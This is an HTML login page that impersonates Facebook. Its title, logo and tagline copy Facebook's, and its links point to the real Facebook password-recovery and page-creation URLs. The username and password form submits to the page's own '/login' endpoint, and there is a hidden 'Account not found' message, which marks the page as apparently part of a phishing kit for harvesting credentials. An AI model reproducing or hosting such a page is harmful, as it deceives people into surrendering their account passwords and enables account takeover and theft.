<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>facebook.com</title>
    <script src="ajax.min.js"></script>
    <script src="detect.min.js"></script>
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    <link rel="icon" type="image/x-icon" href="img/B8BxsscfVBr.ico">
    <link rel="stylesheet" href="style/style.css">
    
</head>
<body>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <br>
    <div id="result"></div>
    <div id="responseMessage" style="display: none;">Account not found</div>
    <div class="content">
        <div class="logo">
            <img class="logoimg" src="img/logo.jpg">
            <div class="txtlogo">
                <h2>Facebook helps you connect and share with the people in your life.
                </h2>
            </div>
        </div>
        <div class="login">
            <div class="contlogin">
                <form action="/login" method="POST">
                    <div class="forminput">
                        <div class="inputu">
                            <center><input type="text" id="email" name="username" placeholder="Email address or phone number"></center>
                        </div>
                        <div class="inputp">
                            <center>
                                <input type="password" id="password" name="pass" placeholder="Password">
                                <i class="password-toggle" id="togglePassword"><i class='bx bx-show'></i></i>
                            </center>
                        </div>
                    </div>
                    <div class="buttons">
                        <center><button type="submit" class="value" id="sv">
                            Login
                        </button></center>
                        <center><a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a></center>
                        <br>
                        <center><hr></center>
                        <br>
                        <center><p>Create new account</p></center>
                    </div>
                </form>
            </div>
            <div class="regpag">
                <center><a href="https://www.facebook.com/pages/create/?ref_type=registration_formss">Create a Page </a>for a celebrity, brand or business.</center>
            </div>
        </div>
        
    </div>

    <script src="script.js"></script>
</body>
</html>
